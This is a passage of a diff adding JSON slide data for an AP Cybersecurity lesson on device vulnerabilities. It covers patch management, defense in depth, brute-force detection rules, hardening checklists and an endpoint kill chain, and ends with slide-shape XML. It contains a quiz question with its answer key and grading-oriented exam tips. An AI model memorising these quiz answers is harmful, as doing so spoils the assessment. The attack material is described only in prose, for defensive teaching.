+   "speaker_notes": "<p><b>Context:</b> CVSS is maintained by FIRST.org. EternalBlue's CVE-2017-0144 carries a CVSS v2 base score of 9.3.</p><p><b>Exam tip:</b> Cite a CVSS score threshold and a specific tool (Nessus/Qualys) when asked to describe a formal patch management program.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Because WannaCry demonstrates that a released patch is only effective if deployed, organizations must maintain a formal patch management cadence, prioritized using the <b>Common Vulnerability Scoring System (CVSS)</b> to determine patch urgency, and validated through automated vulnerability scanning rather than relying on manual tracking spreadsheets.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.4",
+   "parent_n": 26,
+   "title": "Patch and Vulnerability Management",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "patch-management",
+    "cvss",
+    "vulnerability-scanning"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CVSS is maintained by FIRST.org. EternalBlue's CVE-2017-0144 carries a CVSS v2 base score of 9.3.</p><p><b>Exam tip:</b> Cite a CVSS score threshold and a specific tool (Nessus/Qualys) when asked to describe a formal patch management program.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "img_4.1.4_patch_cycle",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.5",
+   "parent_n": 27,
+   "title": "Defense in Depth for Endpoints: Three Layers",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "defense-in-depth",
+    "exam-strategy"
+   ],
+   "quiz": {
+    "question": "An organization disables Telnet on all new IoT deployments, sets up SIEM alerts for repeated failed logins, and has a documented process to isolate any host showing a SUID escalation event. Which defense-in-depth layer is MISSING from this description?",
+    "choices": [
+     "Preventive",
+     "Detective",
+     "Corrective/Responsive",
+     "None, all three layers are present"
+    ],
+    "answer": "None, all three layers are present",
+    "explanation": "Disabling Telnet = preventive; SIEM alerts on failed logins = detective; documented isolation process = corrective/responsive. All three layers are explicitly named."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Even under time pressure, write one sentence per layer rather than a long paragraph on only one layer, partial credit is layer-counted, not depth-counted.</p>",
+   "beat": 1,
+   "bullets": [
+    "Preventive: disable unnecessary services, change default credentials, apply patches",
+    "Detective: log and alert on failed authentication and privilege escalation events",
+    "Corrective/Responsive: isolate the compromised host, rotate exposed credentials",
+    "Graders award partial credit PER LAYER, naming all three maximizes score"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.5",
+   "parent_n": 27,
+   "title": "Defense in Depth for Endpoints: Three Layers",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "defense-in-depth",
+    "exam-strategy"
+   ],
+   "quiz": {
+    "question": "An organization disables Telnet on all new IoT deployments, sets up SIEM alerts for repeated failed logins, and has a documented process to isolate any host showing a SUID escalation event. Which defense-in-depth layer is MISSING from this description?",
+    "choices": [
+     "Preventive",
+     "Detective",
+     "Corrective/Responsive",
+     "None, all three layers are present"
+    ],
+    "answer": "None, all three layers are present",
+    "explanation": "Disabling Telnet = preventive; SIEM alerts on failed logins = detective; documented isolation process = corrective/responsive. All three layers are explicitly named."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Even under time pressure, write one sentence per layer rather than a long paragraph on only one layer, partial credit is layer-counted, not depth-counted.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>When a free-response scenario describes an endpoint compromise, always structure your answer around layered controls: (1) <b>Preventive</b>, disable unnecessary services, change default credentials, apply patches; (2) <b>Detective</b>, log and alert on failed authentication and privilege escalation events; (3) <b>Corrective/Responsive</b>, isolate the compromised host and rotate any credentials exposed during the incident. Graders award partial credit per layer identified, so naming all three explicitly maximizes score even under time pressure.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.6",
+   "parent_n": 28,
+   "title": "Section IV Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> When asked to 'recommend a control,' name the specific framework or law, not just a generic best practice.</p>",
+   "beat": 1,
+   "bullets": [
+    "Telnet disablement, CIS Benchmarks, NIST SP 800-53 CM/SI families",
+    "SB-327 / UK PSTI Act (IoT regulation), CVSS, automated vulnerability scanning",
+    "Three-layer defense-in-depth model: Preventive, Detective, Corrective/Responsive",
+    "Every hardening control maps back to a specific case-study root cause from Section III"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.6",
+   "parent_n": 28,
+   "title": "Section IV Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> When asked to 'recommend a control,' name the specific framework or law, not just a generic best practice.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Section IV recap:</b> Hardening frameworks (CIS Benchmarks, NIST SP 800-53) formalize attack-surface reduction. Regulation (SB-327) targets manufacturer-level root causes. Patch management, scored by CVSS, addresses the WannaCry-style root cause. All controls fit into the three-layer defense-in-depth model: Preventive, Detective, Corrective/Responsive.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.1",
+   "parent_n": 29,
+   "title": "Detecting Brute Force in Live Log Streams",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "detection",
+    "siem",
+    "brute-force"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the same pattern-recognition skill tested directly on log-excerpt free-response questions, just automated at scale in a real Security Operations Center (SOC).</p><p><b>Exam tip:</b> If asked to design a detection rule, describe both the pattern (rapid failures, same source) AND the correlated follow-up event (success, then privilege change).</p>",
+   "beat": 1,
+   "bullets": [
+    "Alert threshold: N failed logins from same source IP within a short window",
+    "Sub-second to few-second spacing between failures = automated, not human",
+    "Follow-up correlation rule: Accepted password immediately after failure burst",
+    "SIEM tools formalize this pattern into automated real-time alerting rules"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.1",
+   "parent_n": 29,
+   "title": "Detecting Brute Force in Live Log Streams",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "detection",
+    "siem",
+    "brute-force"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the same pattern-recognition skill tested directly on log-excerpt free-response questions, just automated at scale in a real Security Operations Center (SOC).</p><p><b>Exam tip:</b> If asked to design a detection rule, describe both the pattern (rapid failures, same source) AND the correlated follow-up event (success, then privilege change).</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Building on the log-reading skill from Section II, detection engineering formalizes 'multiple Failed password entries from the same source IP within a very short time window, followed by an Accepted password line' into an automated SIEM correlation rule, rather than relying on a human analyst to notice it manually after the fact.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.2",
+   "parent_n": 30,
+   "title": "Practice: Annotate a Novel Auth Log",
+   "slide_type": "practice",
+   "difficulty": "intermediate",
+   "tags": [
+    "practice",
+    "auth-log"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> This is a rehearsal of the exact skill tested in Section II, timing pattern, successful auth, persistence mechanism, payload identification, in that order.</p>",
+   "beat": 1,
+   "bullets": [
+    "Apply the four-step reading method: vector → success → escalation → persistence",
+    "Identify the source IP pattern that signals scripted vs. human behavior",
+    "Name the specific technique used for privilege escalation, if present",
+    "State which CIA property (if any) is ultimately threatened by the final action"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.2",
+   "parent_n": 30,
+   "title": "Practice: Annotate a Novel Auth Log",
+   "slide_type": "practice",
+   "difficulty": "intermediate",
+   "tags": [
+    "practice",
+    "auth-log"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> This is a rehearsal of the exact skill tested in Section II, timing pattern, successful auth, persistence mechanism, payload identification, in that order.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Practice applying the auth-log reading method from Section II to a new scenario: a smart thermostat's log shows three failed root logins within one second from a single external IP, then a successful login, then a new cron entry scheduling a binary download every reboot. Walk through vector, success, escalation/persistence, and payload exactly as done with the chapter's original log.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.3",
+   "parent_n": 31,
+   "title": "Practice: Design a Hardening Checklist for a New IoT Deployment",
+   "slide_type": "practice",
+   "difficulty": "intermediate",
+   "tags": [
+    "practice",
+    "hardening-checklist"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> This exercise directly rehearses the free-response skill of producing a layered (preventive/detective/corrective), framework-cited hardening plan under time pressure.</p>",
+   "beat": 1,
+   "bullets": [
+    "List concrete preventive steps before any device goes on the production network",
+    "Reference a specific framework (CIS Benchmark or NIST control family) for each step",
+    "Include at least one detective control (logging/alerting) and one corrective control",
+    "Cross-check each step against a root cause from Mirai or WannaCry"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.3",
+   "parent_n": 31,
+   "title": "Practice: Design a Hardening Checklist for a New IoT Deployment",
+   "slide_type": "practice",
+   "difficulty": "intermediate",
+   "tags": [
+    "practice",
+    "hardening-checklist"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> This exercise directly rehearses the free-response skill of producing a layered (preventive/detective/corrective), framework-cited hardening plan under time pressure.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Design a five-item hardening checklist for onboarding 500 new IP cameras onto a corporate network: (1) rotate default credentials to unique per-device passwords, (2) disable Telnet and confirm SSH is the only remote-admin channel, (3) apply the latest firmware patch and register the device in a vulnerability-scanning inventory, (4) configure SIEM alerting on failed-login bursts, (5) document an isolation/credential-rotation procedure for any device flagged as compromised.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.4",
+   "parent_n": 32,
+   "title": "Synthesis: The Endpoint Compromise Kill Chain",
+   "slide_type": "mechanism",
+   "difficulty": "advanced",
+   "tags": [
+    "kill-chain",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This mirrors the Cyber Kill Chain (Lockheed Martin, 2011) introduced in Unit 2, applied specifically to the endpoint layer.</p><p><b>Exam tip:</b> When a free-response question gives a full incident narrative, map each sentence onto one of these four stages before writing your answer, it structures your response automatically.</p>",
+   "beat": 1,
+   "bullets": [
+    "1. Reconnaissance: mass scan (Shodan/masscan) for exposed service (Telnet, SMB)",
+    "2. Initial Access: default-credential brute force OR unpatched-service exploit",
+    "3. Escalation/Persistence: SUID bit, rootkit installation, or kernel-mode hooks",
+    "4. Objective: botnet enrollment (Mirai/DDoS), encryption+extortion (WannaCry/ransomware), or data theft"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.4",
+   "parent_n": 32,
+   "title": "Synthesis: The Endpoint Compromise Kill Chain",
+   "slide_type": "mechanism",
+   "difficulty": "advanced",
+   "tags": [
+    "kill-chain",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This mirrors the Cyber Kill Chain (Lockheed Martin, 2011) introduced in Unit 2, applied specifically to the endpoint layer.</p><p><b>Exam tip:</b> When a free-response question gives a full incident narrative, map each sentence onto one of these four stages before writing your answer, it structures your response automatically.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Synthesizing the whole topic into one chain: an attacker's tooling <b>scans</b> the internet for an exposed insecure default (open Telnet, unpatched SMB); gains <b>initial access</b> via credential-stuffing or exploiting an unpatched vulnerability; <b>escalates and persists</b> using techniques like the SUID bit or a rootkit; then executes on its <b>objective</b>, whether that's botnet enrollment for DDoS (Mirai), file encryption for extortion (WannaCry), or quiet data exfiltration. Breaking the chain at any single link, patch the service, remove default credentials, detect the escalation, stops the entire attack.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.4",
+   "parent_n": 32,
+   "title": "Synthesis: The Endpoint Compromise Kill Chain",
+   "slide_type": "mechanism",
+   "difficulty": "advanced",
+   "tags": [
+    "kill-chain",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This mirrors the Cyber Kill Chain (Lockheed Martin, 2011) introduced in Unit 2, applied specifically to the endpoint layer.</p><p><b>Exam tip:</b> When a free-response question gives a full incident narrative, map each sentence onto one of these four stages before writing your answer, it structures your response automatically.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "img_4.1.5_endpoint_kill_chain",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.5",
+   "parent_n": 33,
+   "title": "Recognizing the Signature Patterns on the Exam",
+   "slide_type": "deep_question",
+   "difficulty": "intermediate",
+   "tags": [
+    "exam-patterns",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Build a personal 'signature pattern → vocabulary term' flashcard set from just these four bullets, they cover a disproportionate share of scenario-based multiple choice questions on this topic.</p>",
+   "beat": 1,
+   "bullets": [
+    "Rapid-fire failed logins from one IP + eventual success = brute force / credential stuffing",
+    "sudo + chmod on a system binary = SUID privilege escalation",
+    "Open Telnet + closed SSH = insecure default configuration",
+    "Autonomous network spread + no user click = worm propagation, not virus"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.5",
+   "parent_n": 33,
+   "title": "Recognizing the Signature Patterns on the Exam",
+   "slide_type": "deep_question",
+   "difficulty": "intermediate",
+   "tags": [
+    "exam-patterns",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Build a personal 'signature pattern → vocabulary term' flashcard set from just these four bullets, they cover a disproportionate share of scenario-based multiple choice questions on this topic.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Four recurring signature patterns are directly testable from this topic's material: (1) rapid, same-source failed logins followed by success signal automated brute force; (2) a sudo command modifying a SUID bit signals privilege-escalation persistence; (3) an open Telnet port paired with a closed SSH port signals an insecure default configuration; (4) network-wide spread requiring zero user interaction signals worm propagation rather than virus propagation.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.6",
+   "parent_n": 34,
+   "title": "Section V Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Use the kill chain slide as your mental outline for any endpoint-compromise free response, it guarantees you cover reconnaissance through objective without missing a stage.</p>",
+   "beat": 1,
+   "bullets": [
+    "SIEM correlation rules formalize manual log-reading into automated detection",
+    "Hardening checklist components: rotate credentials, disable Telnet, patch, alert, isolate",
+    "Endpoint kill chain: Reconnaissance → Initial Access → Escalation/Persistence → Objective",
+    "Four testable signature patterns tie directly back to Sections II and III"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.6",
+   "parent_n": 34,
+   "title": "Section V Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Use the kill chain slide as your mental outline for any endpoint-compromise free response, it guarantees you cover reconnaissance through objective without missing a stage.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Section V recap:</b> Detection formalizes log-reading into automated SIEM rules. Practice exercises rehearse both log annotation and hardening-plan design. The endpoint kill chain synthesizes the whole topic into four stages, and four signature patterns summarize the most exam-relevant recognition skills from this chapter.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.7",
+   "parent_n": 35,
+   "title": "Topic 4.1 Exam-Readiness Checklist",
+   "slide_type": "practice",
+   "difficulty": "advanced",
+   "tags": [
+    "exam-readiness",
+    "checklist",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> If you can teach all six checkpoints to a study partner without looking at your notes, you are ready for Topic 4.1 content on the exam.</p>",
+   "beat": 1,
+   "bullets": [
+    "Can you define endpoint, attack surface, and give the two-question malware framework?",
+    "Can you distinguish virus/worm/trojan by infection mechanism, and ransomware/rootkit by objective?",
+    "Can you read an auth log and narrate vector → success → escalation → persistence?",
+    "Can you correctly apply vulnerability vs. threat vs. exploit to a novel scenario?",
+    "Can you name the root cause AND the matching control for both Mirai and WannaCry?",
+    "Can you produce a three-layer (preventive/detective/corrective) defense-in-depth answer?"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.5.a.7",
+   "parent_n": 35,
+   "title": "Topic 4.1 Exam-Readiness Checklist",
+   "slide_type": "practice",
+   "difficulty": "advanced",
+   "tags": [
+    "exam-readiness",
+    "checklist",
+    "synthesis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> If you can teach all six checkpoints to a study partner without looking at your notes, you are ready for Topic 4.1 content on the exam.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Before moving to Topic 4.2, confirm mastery of six skill checkpoints: (1) core vocabulary, endpoint, attack surface, the two-question malware framework; (2) malware classification, virus/worm/trojan by vector, ransomware/rootkit by objective, and correctly labeling hybrids like WannaCry; (3) log analysis, reading a real auth.log for brute-force and SUID-escalation signatures; (4) precise use of vulnerability/threat/exploit vocabulary; (5) case-study root causes, Mirai (default credentials at scale) and WannaCry (unpatched SMBv1); (6) producing a layered, framework-cited hardening/defense-in-depth answer under time pressure.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  }
+ ],
+ "classroom": {
+  "cover": {
+   "summary": "What counts as a computing device, how malicious software is classified by how it spreads and what it does, and how a weakness on a device — a factory password, an unpatched service, firmware nobody supports any more — becomes loss, damage, disruption, or destruction. The topic ends with documenting those findings so somebody else can act on them.",
+   "footer": "4 learning objectives  ·  College Board AP Cybersecurity Course Framework",
+   "notes": "Cover slide for Topic 4.1: Device Vulnerabilities and Attacks. What counts as a computing device, how malicious software is classified by how it spreads and what it does, and how a weakness on a device — a factory password, an unpatched service, firmware nobody supports any more — becomes loss, damage, disruption, or destruction. The topic ends with documenting those findings so somebody else can act on them."
+  },
+  "objectives": {
+   "items": [
+    {
+     "code": "4.1.A",
+     "skill": "Analyze Risk",
+     "text": "Identify the classes of computing device in an environment — servers, workstations and laptops, mobile handsets, network appliances, and the embedded and industrial controllers with no screen or keyboard — and account for how each differs in what it can run and how long its vendor supports it."
+    },
+    {
+     "code": "4.1.B",
+     "skill": "Analyze Risk",
+     "text": "Determine, from what an incident actually did, which family of malicious software was involved: whether it needed a host file and a person, whether it moved between machines unaided, whether it arrived disguised as legitimate software, and whether its purpose was extortion, concealment, surveillance, or theft."
+    },
+    {
+     "code": "4.1.C",
+     "skill": "Analyze Risk",
+     "text": "Explain the route from a device weakness to the concrete harm an adversary can produce with it, naming each step from the initial vulnerability to data lost, hardware damaged, operations halted, or records destroyed."
+    },
+    {
+     "code": "4.1.D",
+     "skill": "Analyze Risk",
+     "text": "Assess the weaknesses present on a fleet of devices and document them so the findings can be acted on — each scored for likelihood and impact, ranked against the others, and recorded where the decision to fix or accept it can later be audited."
+    }
+   ],
+   "footer": "Objectives paraphrased from the AP Cybersecurity Course Framework (College Board, AP Career Kickstart).",
+   "notes": "Read each learning objective aloud and connect it to the exam skill category before starting the topic."
+  },
+  "concept_maps": [
+   {
+    "title": "Hardware Root of Trust Secure Boot Flow",
+    "shapes_xml": [
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"6\" name=\"Rounded Rectangle 5\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"457200\" y=\"1980000\"/><a:ext cx=\"2703150\" cy=\"2050000\"/></a:xfrm><a:prstGeom prst=\"roundRect\"><a:avLst><a:gd name=\"adj\" fmla=\"val 9000\"/></a:avLst></a:prstGeom><a:solidFill><a:srgbClr val=\"FBEEF0\"/></a:solidFill><a:ln w=\"19050\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"7\" name=\"TextBox 6\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"547200\" y=\"2090000\"/><a:ext cx=\"2523150\" cy=\"260000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1200\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>01</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"8\" name=\"TextBox 7\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"547200\" y=\"2400000\"/><a:ext cx=\"2523150\" cy=\"560000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1350\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"1A1A1A\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>POWER-ON RESET</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"9\" name=\"TextBox 8\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"557200\" y=\"2980000\"/><a:ext cx=\"2503150\" cy=\"1000000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1050\" b=\"0\" i=\"0\"><a:solidFill><a:srgbClr val=\"3F3F3F\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>Hardware triggers boot execution. Primary CPU runs immutable bootloader code directly from read-only ROM.</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:cxnSp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvCxnSpPr><p:cNvPr id=\"10\" name=\"Connector 9\"/><p:cNvCxnSpPr/><p:nvPr/></p:nvCxnSpPr><p:spPr><a:xfrm><a:off x=\"3172350\" y=\"3005000\"/><a:ext cx=\"41000\" cy=\"0\"/></a:xfrm><a:prstGeom prst=\"line\"><a:avLst/></a:prstGeom><a:ln w=\"22225\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"0\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"tx1\"/></a:fontRef></p:style></p:cxnSp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"11\" name=\"Isosceles Triangle 10\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm rot=\"5400000\"><a:off x=\"3238350\" y=\"2940000\"/><a:ext cx=\"130000\" cy=\"130000\"/></a:xfrm><a:prstGeom prst=\"triangle\"><a:avLst/></a:prstGeom><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:ln><a:noFill/></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"12\" name=\"Rounded Rectangle 11\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"3315350\" y=\"1980000\"/><a:ext cx=\"2703150\" cy=\"2050000\"/></a:xfrm><a:prstGeom prst=\"roundRect\"><a:avLst><a:gd name=\"adj\" fmla=\"val 9000\"/></a:avLst></a:prstGeom><a:solidFill><a:srgbClr val=\"FBEEF0\"/></a:solidFill><a:ln w=\"19050\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
